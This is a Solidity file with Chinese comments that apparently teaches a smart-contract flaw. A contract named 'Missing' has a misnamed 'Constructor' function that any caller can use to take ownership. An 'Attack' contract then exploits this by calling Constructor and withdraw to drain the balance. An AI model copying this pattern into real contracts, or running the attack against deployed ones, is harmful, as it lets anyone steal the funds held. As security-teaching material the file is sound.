// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.0;

// 漏洞說明：
// 此合約錯把普通函數 'Constructor' 當作建構子的命名，導致合約在部署後，任何人都可呼叫 'Constructor'，
// 進而改變 owner ，造成嚴重安全風險。

contract Missing {
    // 漏洞：狀態變數 owner 未正確保護，因為建構子未正確定義
    address payable private owner;

    // Modifier 僅允許 owner 呼叫
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    // 錯誤的建構子命名，因為合約名稱為 Missing，正確應使用 constructor()
    function Constructor() public {
        // 漏洞：任何人呼叫此函數均可成為 owner
        owner = payable(msg.sender);
    }

    // 接收 Ether 的函數
    // 使用 receive() 處理僅轉入 Ether 的情形
    receive() external payable {}

    // 提款函數，只允許 owner 呼叫
    function withdraw() public onlyOwner {
        owner.transfer(address(this).balance);
    }
}

// 攻擊合約: 演示如何利用錯誤的建構子命名來竊取合約餘額
contract Attack {
    Missing public vulnerableContract;

    // 修改參數類型為 address payable，以符合合約中 payable fallback 的定義
    constructor(address payable _vulnerableAddress) {
        vulnerableContract = Missing(_vulnerableAddress);
    }

    // 攻擊步驟：
    // 1. 呼叫 vulnerableContract 的 Constructor 函數，註冊攻擊者為 owner
    // 2. 呼叫 withdraw 函數，提取合約中的所有 Ether
    function attack() external {
        // 攻擊者成為 owner
        vulnerableContract.Constructor();
        // 將合約所有 Ether 轉出
        vulnerableContract.withdraw();
    }

    // 接收 Ether
    receive() external payable {}
}
